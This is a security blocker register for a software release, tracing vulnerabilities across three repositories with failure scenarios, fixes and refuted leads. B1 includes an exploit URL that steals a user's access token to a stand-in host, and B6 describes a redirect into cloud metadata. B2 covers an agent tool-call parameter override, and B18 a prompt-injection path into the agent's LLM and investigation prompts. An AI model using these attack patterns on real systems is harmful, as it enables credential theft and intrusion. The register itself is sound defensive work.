# Release 2026-11-11 — blocker register

Every item below was traced to source before being written down. Verdicts
are **CONFIRMED** (reproduced or read end-to-end in the actual code),
**PARTIAL** (the mechanism is real but incomplete), or **REFUTED** (the
lead was wrong — recorded so nobody re-investigates it).

Line numbers are as of the baseline commits in `STATE.md`. Where a fix has
landed on `release/2026-11-11`, the line numbers refer to the code as it
was _before_ the fix.

Last updated: 2026-09-08.

## Status summary

| Status                                       | Count |
| -------------------------------------------- | ----- |
| Fixed on the release branch, pinned by tests | 12    |
| Open                                         | 11    |
| Refuted (no action)                          | 4     |

Fixed since this register was opened: B1, B2, B4, B6, B8, B9, B10, B11,
B12, B13, B22, and the pagination half of B16. B17's API and web halves are
both done. Three further defects were found _during_ the work and are
recorded in `evidence/2026-09-08-gates.md` rather than here, because they
were fixed in the same pass they were found: a JWT clock-tolerance
regression, a dark-theme AA contrast failure in `StatusBadge`, and a
`DropdownMenuLabel` crash that took down the topbar user menu in production
builds.

---

## B1 — BFF upstream host injection exfiltrates the user's access token

**Repo** `manar-web` · **Severity** critical · **Status** FIXED on `release/2026-11-11`

`app/api/bff/[...path]/route.ts` built its upstream URL as
`new URL(`/${path.join("/")}${search}`, env.MANAR_API_BASE_URL)`. Next
decodes each catch-all segment individually, so
`/api/bff/%2Fcollector.example/x` arrives as
`["/collector.example", "x"]`; joining that yields
`"//collector.example/x"`, a **protocol-relative reference** that
`new URL()` resolves against the base's scheme while discarding its host.

Failure scenario: a logged-in user follows a link to
`https://manar.example/api/bff/%2Fcollector.example/x`. The session cookie
is `SameSite=Lax`, so a top-level cross-site GET carries it. The proxy
decrypts the session, refreshes the token if needed, and issues the
request to the attacker's host **with `Authorization: Bearer <the user's
Keycloak access token>`**. The attacker replays that token directly
against `manar-api` for its full lifetime — defeating the entire purpose
of the token-handler pattern. In the Helm topology `manar-web` is the only
public ingress, so the same primitive is also an authenticated,
browser-driven full-read SSRF into the cluster and cloud metadata
(the response body is streamed back to the caller).

**Fix:** `lib/api/bff-request.ts` — segments are validated (no `/`, `\`,
traversal, control characters) and re-encoded with `encodeURIComponent`,
the base URL's path prefix is preserved, and `assertUpstreamOrigin` is
enforced both inside the builder and again at the dispatch site. Pinned by
`__tests__/bff-request.test.ts` (23 tests), which includes an assertion
demonstrating the protocol-relative resolution the defect relied on, so
the regression stays legible.

## B2 — MCP adapter lets caller params overwrite the authorized resource

**Repo** `manar-api` · **Severity** critical · **Status** FIXED on `release/2026-11-11`

`src/tools/mcp-tool.adapter.ts:119` built the JSON-RPC arguments as
`{ resource, ...(params as Record<string, unknown>) }` — spreading
caller-controlled `params` **after** the canonical field.

Failure scenario: an agent calls `POST /agent/v1/tools/invoke` with
`resource: "host-42"` and `params: { resource: "host-999" }`. OpenFGA and
the policy engine authorize **host-42**; `parameterHash` binds
consistently, so an approval grant also validates; the `ToolInvocation`
row and the audit event both record **host-42**. The MCP server receives
and acts on **host-999**.

This is worse than an ordinary authorization bypass because the audit
chain records the action Manar _authorized_ rather than the one it
_performed_. Every downstream artefact that cites the audit trail —
approvals, evidence exports, compliance mappings — inherits the wrong
fact, and no after-the-fact review can detect it.

`validateAgainstSchema` did not close this: stored `inputSchema` values are
not required to set `additionalProperties: false`, and the seeded demo
action ships the wide-open `{ type: 'object' }`.

**Fix:** a reserved-argument-name check placed with the other pure input
validation, ahead of the SSRF check and the transport, which _rejects_ a
colliding key rather than silently reordering the spread (reordering would
make the canonical value win but would quietly discard what the caller
asked for — the same dishonesty relocated). Canonical fields are also now
spread last as defence in depth. The whole connect→invoke→close lifecycle
is bounded, closing a second finding in the same file. Pinned by
`src/tools/mcp-tool.adapter.spec.ts` (5 tests, no network).

## B3 — Published placeholder secrets boot cleanly in production

**Repo** `manar-api` · **Severity** high · **Status** OPEN

`.env.example` ships `APPROVAL_GRANT_SIGNING_SECRET`,
`PLATFORM_KILL_SWITCH_OPERATOR_TOKEN`, `MANAR_BFF_SERVICE_TOKEN`,
`OPENBAO_TOKEN` and `KEYCLOAK_ADMIN_PASSWORD` as placeholder values that
all satisfy their `.min(16)`/`.min(1)` schemas. `cp .env.example .env` with
`NODE_ENV=production` boots without complaint.

Chained with B4, anyone who has read the repository then holds
`MANAR_BFF_SERVICE_TOKEN` — which reads **every tenant's** OIDC client
secret — and `PLATFORM_KILL_SWITCH_OPERATOR_TOKEN`, which denies the whole
platform.

The correct pattern already exists one file over: `src/security/cors.ts`
refuses to boot in production on a known-unsafe value.

**Action:** boot-time guard rejecting the published sentinels when
`NODE_ENV === 'production'`.

## B4 — Cross-tenant secret read guarded by a timing-unsafe comparison

**Repo** `manar-api` · **Severity** high · **Status** FIXED — constant-time comparison via `src/common/security/constant-time-compare.ts`. Endpoint scoping remains open.

`GET /tenants/:slug/oidc-client-secret`
(`src/tenants/tenants.controller.ts:85`) returns **any** tenant's Keycloak
client secret by slug, gated only by `src/tenants/bff-service.guard.ts:36`.
That guard compares with `provided !== expected` at line 44 — while its own
doc comment at line 19 claims a "constant-shape comparison".
`src/kill-switches/platform-operator.guard.ts:60` has the identical
problem on the platform-wide kill switch.

The repo already imports `crypto.timingSafeEqual` for webhook signatures
(`src/webhooks/webhook-signing.ts:82`); the pattern simply was not applied
here.

**Action:** constant-time comparison; separately, scope the endpoint to the
requesting tenant rather than allowing arbitrary slugs.

## B5 — Tenant OIDC client secrets stored in plaintext in the control DB

**Repo** `manar-api` · **Severity** high · **Status** OPEN

`src/keycloak/tenant-provisioning.service.ts:105-113` writes the raw
Keycloak client secret into `SecretReference.reference` with
`provider: 'CONTROL_DB'`; `src/tenants/tenants.service.ts:100` returns it
verbatim. `prisma/control.prisma:148-150` states that `reference` is
"never the credential value itself" — which is false for this kind.

Any read of the control DB — a backup, a replica, a restored dump, an ops
`SELECT` — yields every tenant's OIDC confidential client secret in the
clear. OpenBao KV is already wired for tool and webhook secrets and is
simply not used here.

## B6 — Redirect-following defeats the SSRF guard and leaks tool credentials

**Repo** `manar-api` · **Severity** high · **Status** FIXED — shared `safeOutboundFetch` re-validates every hop, drops credentials cross-origin, caps at 3 redirects, and bounds the response at 2 MiB. The allow-list-bypasses-private-IP sub-finding remains open.

`assertSafeOutboundUrl` validates only the initial URL.
`src/tools/http-tool.adapter.ts:111-119` and
`src/webhooks/webhook-delivery.service.ts:126-136` both call `fetch`
without a `redirect` option, so undici's default `follow` applies — the
string `redirect:` appears nowhere in `src/`. The HTTP adapter sends
`Authorization: Bearer ${credential}`.

A registered tool host returning `302 → http://169.254.169.254/...` both
reaches the cloud metadata service and exfiltrates the broker-issued tool
credential to whatever host the redirect names.

Two related findings in the same area: there is **no response size limit**
(`http-tool.adapter.ts:122` does `await response.json()` on an unbounded
body, against a 768Mi pod limit), and the allow-list check at
`src/common/ssrf/url-safety.ts:141-143` returns _before_ the private-IP
and DNS checks — so an allow-listed hostname bypasses the loopback and
metadata blocks that `src/common/ssrf/ssrf.config.ts:17-19` and
`docs/security.md:132-134` both claim can "never" be exempted. `.env.example:185`
ships `SSRF_ALLOWED_HOSTS=127.0.0.1,localhost`.

## B7 — Generic retries repeat non-idempotent external actions

**Repo** `manar-api` · **Severity** high · **Status** OPEN

`src/tools/http-tool.adapter.ts:33-34,107-146` retries up to
`MAX_ATTEMPTS=3` on `AbortError`, network errors and 5xx, with no regard
for action semantics. `ToolInvocationStatus` has exactly two values,
`SUCCESS` and `FAILURE` (`prisma/tenant.prisma:773-776`) — there is no way
to record an ambiguous outcome.

Failure scenario: an agent invokes `edr/isolate-host` (seeded with
`mutating: true`) or `iam/disable-user` (`destructive: true`). The target
receives and applies the action, then the response is lost at the 10s
timeout. The adapter retries twice more. The action executes three times
and is recorded as a single `FAILURE` row — the ambiguous outcome is
asserted as "did not happen".

The `ToolAction.mutating`/`destructive` columns the fix needs already
exist. Per brief §7 this also needs an `UNKNOWN` outcome state and
reconciliation, not just suppressed retries.

## B8 — Readiness probe checks nothing

**Repo** `manar-api` · **Severity** high · **Status** FIXED — dependency-aware readiness; only `postgres-control` and `openfga` gate traffic, so optional-AI degradation yields `ready: true, status: degraded`.

`src/health/health.controller.ts:26-30` returns `{status:'ok'}`
unconditionally, behind a stale comment claiming this phase has no
downstream dependencies; there are now nine. It is wired as the Kubernetes
readiness probe (`deploy/helm/manar-api/values.yaml:102-109`).

Note the original review lead — "optional-AI degradation causes permanent
readiness failure" — is **REFUTED**: that failure mode is impossible
because readiness checks nothing at all. The real defect is the inverse. A
rolling deploy while Postgres or OpenFGA is unreachable will mark new pods
Ready, retire the last healthy replica, and route 100% of traffic to pods
that 500 every request. Every client initialiser is best-effort, so
nothing else stops it.

The fix must keep the brief's constraint: optional-AI unavailability must
render as ready-but-degraded, never as readiness failure.

## B9 — A Redis outage restarts every pod

**Repo** `manar-api` · **Severity** high · **Status** FIXED — health routes exempted and rate-limit storage fails open (rate limiting is availability protection running before every auth control; the genuine 429 is re-thrown untouched).

`TenantThrottlerGuard` is a global `APP_GUARD`
(`src/rate-limit/rate-limit.module.ts:42`) with no `@SkipThrottle` anywhere
and no health-route exemption. `@nestjs/throttler` 6.5.0 does not wrap the
storage call, and `src/rate-limit/redis-throttler-storage.service.ts:190`
throws when Redis is down. So `/health/live` returns 500 and the kubelet
restarts every replica — turning a degraded cache into a total outage.

## B10 — The shipped Helm charts cannot boot

**Repo** `manar-api` · **Severity** high · **Status** FIXED — both charts render and lint; `MANAR_BFF_SERVICE_TOKEN` and `CORS_ALLOWED_ORIGINS` wired, `HEALTHCHECK NONE` on the worker stage.

Two independent fatal misconfigurations:

- `MANAR_BFF_SERVICE_TOKEN` is required with `min(16)`
  (`src/tenants/tenants.config.ts:32`) but appears nowhere in `deploy/` —
  absent from both the API and worker charts.
- `values.yaml:119` sets `NODE_ENV: production` but never sets
  `CORS_ALLOWED_ORIGINS`, which then defaults to `'*'`
  (`src/security/security.config.ts:25`) and makes `src/security/cors.ts:20-24`
  throw at bootstrap.

Also `Dockerfile:94` (`FROM runtime AS worker`) inherits the HTTP
`HEALTHCHECK` despite the comment at :91-93 claiming otherwise.

## B11 — manar-ai gRPC is plaintext and unauthenticated

**Repo** `manar-ai` · **Severity** high · **Status** FIXED — mTLS with `require_client_auth=True`, a peer-identity allow-list, and a startup refusal to bind plaintext under staging/production. manar-api client config added (`AI_ADVISORY_TLS_*`), defaulting off. **The two have not yet been run against each other over mTLS.**

`app/grpc/server.py:54` calls `add_insecure_port`; `build_unbound_server`
at :37 passes no credentials and no interceptors; all six servicer methods
accept `context` and never inspect it. Any process that can reach the port
can drive arbitrary text into the configured LLM provider, and a passive
on-path observer reads every `AnalyzeDlp` request in cleartext — that is,
precisely the payloads the platform flagged as containing secrets and PII.
`manar-api` matches with `grpc.credentials.createInsecure()`
(`src/ai-advisory/ai-advisory-client.service.ts:242`), and
`deploy/docker-compose.yml:550-553` publishes `50051` unbound.

The repo documents this as deliberate and deferred
(`manar-ai/docs/ai-security-model.md:98-120`). It is a release gate, not a
latent issue.

## B12 — DLP sends the original unredacted payload to the LLM provider

**Repo** `manar-ai` · **Severity** high · **Status** FIXED — deterministic redaction before the prompt is built, the redacted text re-scanned, and the provider call abandoned if anything still matches. The five other verbatim-interpolation paths remain open.

`app/dlp/service.py:80` runs `patterns.scan(content)`, which only reads —
`_redact` (`app/dlp/patterns.py:92-96`) is applied solely to `m.group(0)`
when building `redactedPreview`. Then `app/dlp/service.py:89-91` sends
`_PROMPT_TEMPLATE.format(content=content)` — the same original string — to
the provider.

With `AI_PROVIDER=anthropic`, every secret, key, JWT and PII value
submitted _for scanning_ is transmitted to `api.anthropic.com` in full.
The regex layer is a detector, not a sanitiser. The prompt's "never repeat
the raw sensitive value" instruction constrains the model's output; the
raw value is already in its input.

The same verbatim interpolation exists in `app/risk/service.py:47`,
`app/prompt_security/service.py:43`, `app/incidents/service.py:56-59`,
`app/policy/service.py:60` and `app/audit/service.py:61-63` —
`InvestigateAudit` being the sharpest, since it forwards authorized audit
content to a third party.

## B13 — manar-ai debug routes are unauthenticated and enabled in production

**Repo** `manar-ai` · **Severity** high · **Status** FIXED — debug router and interactive docs gated on environment and bearer-authenticated; Dockerfile default stage flipped to the gRPC target.

`app/api/analysis.py:73-99` exposes six unauthenticated `POST /debug/*`
routes that mirror the entire gRPC capability over HTTP, plus FastAPI's
default `/docs`, `/redoc` and `/openapi.json` (`app/main.py:69` passes no
`docs_url=None`). `app/main.py:71-72` includes both routers
unconditionally: `settings.environment` is read exactly once in the whole
application, as a log field, and gates nothing.

The Helm chart runs `python -m app.grpc.server`, so uvicorn is not the
deployed entrypoint — but `Dockerfile:97`'s default `CMD` still runs
uvicorn on `0.0.0.0:8000`, so `docker run manar-ai` without
`--target grpc` yields the fully open API.

## B14 — Audit write failure does not stop the external side effect

**Repo** `manar-api` · **Severity** high · **Status** OPEN

`AuditService.recordSafely` (`src/audit/audit.service.ts:199-206`) catches,
logs, and returns `undefined`. It is used at every security-relevant call
site, including `src/tools/credential-broker.service.ts:244`, after which
execution continues to the real tool call at :327.

If the `audit_events` write fails — disk full, lock timeout on a hot
tenant — the call fires against the customer's production EDR or firewall
**with no audit record**, and the caller receives a normal 200. Separately,
state changes and their audit events are in different transactions
(`src/approvals/grant.service.ts:108,118,122`), so a human APPROVE can
persist with no `approval.approved` event.

The durable-write-before-side-effect ordering is otherwise correct and was
verified: the Postgres write is awaited before the adapter fires.

## B15 — No audit outbox; Kafka publication is fire-and-forget

**Repo** `manar-api` · **Severity** medium · **Status** OPEN

`src/audit/audit.service.ts:168-173` calls
`this.kafkaPublisher.publish(...).catch(...)` un-awaited, and
`src/audit/kafka-publisher.service.ts:111-116` swallows the failure after
three attempts. The indexer consumes with `fromBeginning: false` and a
fresh group id. Nothing backfills.

Kafka down for 60 seconds across 500 tool invocations: all 500 Postgres
rows commit, all 500 publishes drop silently, `GET /audit` (OpenSearch
only) shows a one-hour hole with no alert, and recovery requires a human to
run `audit:reindex`. Brief §8 requires a transactional outbox or
equivalent.

## B16 — Audit chain verification is unbounded and anchors are unsigned

**Repo** `manar-api` · **Severity** medium · **Status** PARTIALLY FIXED — verification is keyset-paginated in 1000-row batches (proven to still detect tampering in the second batch) and `audit_events.sequence` is now indexed. **Unsigned anchors and unscheduled verification remain open.**

`src/audit/audit.service.ts:240-242` loads the entire audit table with no
`take`/cursor, over HTTP, against a 768Mi limit — one large tenant
OOM-kills the pod.

Separately and **still open**: `:253-257` accepts any unsigned
`AuditChainAnchor` hash as the first event's predecessor. An actor with
tenant-DB write access can delete the oldest N events and insert one
matching anchor row, and `verifyAuditChain` still returns `{valid:true}`.
History truncation is undetectable. Nothing schedules verification either.

## B17 — Approvers bind parameters they are never shown

**Repo** `manar-api` · **Severity** medium · **Status** FIXED — `ApprovalRequest` persists the risk breakdown and `requiredReason`; `GET /approvals/:id` returns the redacted snapshot, the `parameterDigest`, attribution-split reason codes and the expected effect; `manar-web`'s approval card renders all of it, replacing the two "unavailable" panels.

The binding mechanism itself is genuine and was verified: one-use grants
via a conditional `UPDATE ... WHERE consumedAt IS NULL`, parameter-hash
binding, and a kill-switch recheck at redemption. The gap is what the human
sees. `src/approvals/approvals.dto.ts:47-80` maps the request **without**
`params`, and there is no human `GET /approvals/:id`.

So an approver reviewing `iam/disable-user` on `user-7` cannot see
`params: {scope: "all-sessions", cascade: true}`. They approve; the grant
is cryptographically bound to parameters they were never shown. Brief §3.4
requires the reviewer to receive the exact action under review.

This is the API-side half of the `manar-web` finding that
`approval-detail-view.tsx:137-151` renders "unavailable" placeholders —
the web repo was correct not to fabricate the fields.

## B18 — Prompt-injection detection annotates but does not intervene

**Repo** `manar-api` · **Severity** medium · **Status** OPEN

`src/tools/credential-broker.service.ts:495-527`: on
`injection.detected` it writes an audit event and a 15-minute
`AgentRiskFlag`, then returns the outcome with `data` **unmodified** — the
flagged payload is handed to the agent's own LLM verbatim. The DLP branch
thirty lines earlier _does_ mutate the payload, so the mechanism exists in
the same method.

Related: `src/ai-advisory/ai-advisory-client.service.ts:283-285` collapses
`confidence <= 0` to `null`, discarding manar-ai's deliberate fail-secure
marker (`app/inference/failures.py:61-76`).

A second-order path worth recording: attacker text stored in a
`PROMPT_INJECTION_DETECTED` event's `data.explanation` is re-serialised by
`src/audit/audit-event-formatting.ts:28-33` into `retrievedContext` and can
later land in the region of an investigation prompt that
`manar-ai/app/audit/service.py:34-35` instructs the model to "treat as
available evidence".

## B19 — Placeholder route in the release surface

**Repo** `manar-web` · **Severity** medium (release gate) · **Status** OPEN

`app/[locale]/(app)/authorization/page.tsx` and its `[id]` route render
`NotImplementedPage`, while `lib/nav-config.ts:58` keeps a live sidebar
entry pointing at them. Brief §11's release gates forbid a visible
placeholder route in the release surface. This is also the decision
explorer the brief makes a primary investment (§3.3), so it is scope, not
just a cleanup.

## B20 — Overview and command palette report page-one data as totals

**Repo** `manar-web` · **Severity** medium · **Status** OPEN

`components/manar/overview/overview-dashboard.tsx` computes every figure
client-side from paginated responses — agent status counts and the risk
histogram from at most the first 50 rows per resource
(`:98-157`), and recent-activity/average-risk from `pages[0]` only
(`:114-134`). Nothing calls `fetchNextPage()`.
`components/manar/command-palette.tsx:83-87` searches only `.pages[0]` of
five resources with no truncation affordance, so a miss is
indistinguishable from a genuine absence.

Both are documented in-code as deliberate, and
`hooks/use-attention-counts.ts:20-31` even exposes a `hasMore` flag so the
sidebar can render "N+". The Overview has no such affordance. Brief §4.2
requires authorized server-side aggregates with denominators, freshness and
completeness.

## B21 — manar-web OIDC callback does not verify the ID token or the nonce

**Repo** `manar-web` · **Severity** medium · **Status** OPEN

A `nonce` is generated, stored and sent but never read on callback. There
is no `jwtVerify`/`createRemoteJWKSet` anywhere — `jwks_uri` is parsed and
never used; the ID token is stored and replayed as `id_token_hint`
unvalidated; the access token is only `decodeJwt`'d; there is no
`aud`/`azp` check. Discovery is fetched unauthenticated and cached
forever.

Exploitability today is low (the code exchange is a direct server-to-server
TLS call and manar-api validates independently), but the whole chain rests
on transport trust: a spoofed discovery response redirects the
code-plus-client-secret exchange to an attacker's host.

## B22 — No graceful shutdown

**Repo** `manar-api` · **Severity** medium · **Status** FIXED — `enableShutdownHooks()` in both processes, drain-then-close in the worker, plus `preStop`/`terminationGracePeriodSeconds` in both charts.

`enableShutdownHooks()` appears nowhere in `src/`, so `onModuleDestroy`
never fires on SIGTERM for the tenant Prisma client cache, the Kafka
producer or the Redis clients; the Helm deployments set no `preStop` or
`terminationGracePeriodSeconds`. Every rollout drops in-flight requests and
leaks server-side database connections.

## B23 — `GET /audit` has no fallback when OpenSearch is down

**Repo** `manar-api` · **Severity** medium · **Status** OPEN

`src/audit/opensearch/opensearch-client.service.ts:338` rethrows, so
auditors get 500s even though Postgres holds every row. Separately, the
indexer's Redis publish at `audit-indexer.service.ts:180` sits _outside_
the try block, so a Redis outage throws out of `eachMessage` and the
consumer stops committing offsets — for a best-effort SSE feed.

---

## Refuted leads (recorded so they are not re-investigated)

| Lead                                                      | Verdict     | Why                                                                                                                                                                                                                                                                                                                                                                                |
| --------------------------------------------------------- | ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Missing `tenantId` filter allows cross-tenant reads       | **REFUTED** | Database-per-tenant, not a shared column. All ~60 controller call sites pass the authenticated tenant; tenant comes from the verified issuer or the certificate SAN, never a caller-supplied header. Two raw-SQL sites, both parameterised on an already-scoped client; zero `$queryRawUnsafe`. OpenSearch seeds the tenant term first and merges no caller-supplied query object. |
| Credentials leak into responses, logs, telemetry or audit | **REFUTED** | Outbound headers and bodies are never logged; credential-resolution failures return a fixed message; audit carries only `{type, source, redactedPreview}`; `GET /tools` excludes `credentialReference`; there is no OpenTelemetry in the repo.                                                                                                                                     |
| Any token reaches the browser in `manar-web`              | **REFUTED** | Encrypted `dir`/`A256GCM` httpOnly cookie, 12h cap; no `NEXT_PUBLIC_*` anywhere; Server Components pass only slug/name/email/roles into the RSC payload. This is exactly why B1 mattered — it exfiltrated the token the design otherwise protects.                                                                                                                                 |
| Optional-AI degradation permanently fails readiness       | **REFUTED** | Impossible, because readiness checks nothing (see B8). The AI circuit breaker is correctly cleared, with independent hot and long-form lanes.                                                                                                                                                                                                                                      |

## Not blockers, but logged

- `manar-ai`'s `app/rag/service.py` has **zero importers**, including in
  tests; `build_embedder` has zero callers anywhere. The production image
  carries `opensearch-py[async]` for code no live path executes. Brief §5
  asks for RAG to be wired into a deliberate authorized retrieval flow.
- `manar-ai`'s `anomaly/`, `behavior/` and `evaluation/` packages contain
  exactly one file each — an `__init__.py` with a one-line docstring.
  Several _other_ packages' docstrings still say "Populated in a later
  phase" although they are fully implemented, so docstrings are not a
  reliable signal in that repo; directory contents are.
- `manar-api`'s `lint` script carries `--fix`, so CI rewrites files and
  exits 0 — lint is non-gating for every auto-fixable rule. All 48 current
  findings are in generated code that should simply be eslint-ignored.
- `pnpm test` in `manar-api` is not hermetic: two specs need Postgres on
  55432 and Redis on 6379.
- `packages/demo-soc-tools`' 66 tests and its typecheck run in no pipeline.
- `manar-api`'s README is ~90% stock NestJS boilerplate; `manar-web`'s is
  entirely `create-next-app` boilerplate naming routes and ports that do
  not exist.
- `buf lint`/`buf breaking` are configured in `manar-ai` but no CI job runs
  them, so the proto contract has no automated compatibility gate — which
  brief §2 explicitly asks for.
